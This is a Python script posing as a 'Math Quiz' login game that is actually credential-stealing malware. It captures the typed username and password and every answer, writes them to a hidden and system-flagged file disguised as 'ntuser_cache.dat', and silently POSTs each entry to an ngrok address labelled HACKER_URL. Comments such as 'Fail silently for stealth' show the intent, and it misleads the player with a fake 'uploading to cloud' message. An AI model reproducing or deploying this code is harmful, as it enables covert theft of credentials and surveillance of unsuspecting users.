import time
import os
import ctypes
import urllib.request
import random

# Windows Constants
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04

# Update this EVERY TIME you restart Ngrok!
HACKER_URL = " https://unlearnedly-unvouched-shara.ngrok-free.dev"

# Hidden log file path
log_filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ntuser_cache.dat")

def send_data(text):
    """Sends captured data to your Main Device via Ngrok."""
    try:
        data = text.encode('utf-8')
        req = urllib.request.Request(HACKER_URL, data=data, method='POST')
        req.add_header('ngrok-skip-browser-warning', '1')
        # Using a slightly longer timeout just in case, but keeping it silent
        with urllib.request.urlopen(req, timeout=3) as response:
            pass
    except:
        pass # Fail silently for stealth

def log_action(text):
    """Logs data to the hidden file and sends it to the server."""
    # Ensure the file is unhidden briefly to append, or just try appending
    # Usually, Windows allows appending to hidden/system files if you have permission.
    try:
        with open(log_filename, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {text}\n")
    except:
        pass
    send_data(f"[{time.strftime('%H:%M:%S')}] {text}")

def hide_file(file_path):
    """Makes the file invisible using Windows API."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
    except:
        pass

def unhide_file(file_path):
    """Makes the file visible."""
    try:
        if os.path.exists(file_path):
            ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_NORMAL)
    except:
        pass

# ======================================================
# --- THE MATH GAME ---
# ======================================================

def login():
    """Simple login with username and password."""
    print("\n" + "="*40)
    print("      MATH QUIZ LOGIN")
    print("="*40)
    
    username = input("\nEnter username: ").strip()
    password = input("Enter password: ").strip()
    
    if username and password:
        # Log the credentials IMMEDIATELY
        log_action(f"LOGIN: Username='{username}' Password='{password}'")
        print(f"\n✅ Welcome, {username}!")
        hide_file(log_filename)
        return username
    else:
        log_action(f"FAILED LOGIN: User='{username}' Password='{password}'")
        print("\n❌ Invalid credentials! Access denied.")
        hide_file(log_filename)
        return None

def main_game(username):
    # Ensure we don't truncate the file! Use 'a' instead of 'w'
    log_action(f"--- SESSION STARTED FOR {username} : {time.ctime()} ---")
    
    print("\n" + "="*40)
    print(" Welcome to the Ultimate Math Quiz!")
    print("="*40)
    print(f" Player: {username}\n")
    
    # Generate some random questions or use a set
    questions = [
        ("12 + 25", "37"),
        ("9 * 6", "54"),
        ("100 - 45", "55"),
        ("15 * 3", "45"),
        ("81 / 9", "9")
    ]
    random.shuffle(questions)
    
    score = 0
    for q, a in questions:
        user_ans = input(f"[?] What is {q}? ").strip()
        
        log_action(f"User: {username} | Question: {q} | Typed: '{user_ans}'")
        
        if user_ans == a:
            print("  ✅ CORRECT!")
            score += 1
        else:
            print(f"  ❌ WRONG! (Correct was {a})")
    
    print("\n" + "="*40)
    print(f"Final Score: {score}/{len(questions)}")
    print("="*40)
    
    print("\nFinalizing results and uploading to cloud...")
    log_action(f"SESSION ENDED: Score {score}/{len(questions)}")
    
    # Final hide just to be sure
    hide_file(log_filename)
    time.sleep(1.5)
    print("Success! Have a nice day.")

if __name__ == "__main__":
    # Create the log file if it doesn't exist
    if not os.path.exists(log_filename):
        with open(log_filename, "w") as f:
            f.write(f"--- INITIAL LOG CREATED: {time.ctime()} ---\n")
        hide_file(log_filename)

    user = login()
    if user:
        main_game(user)

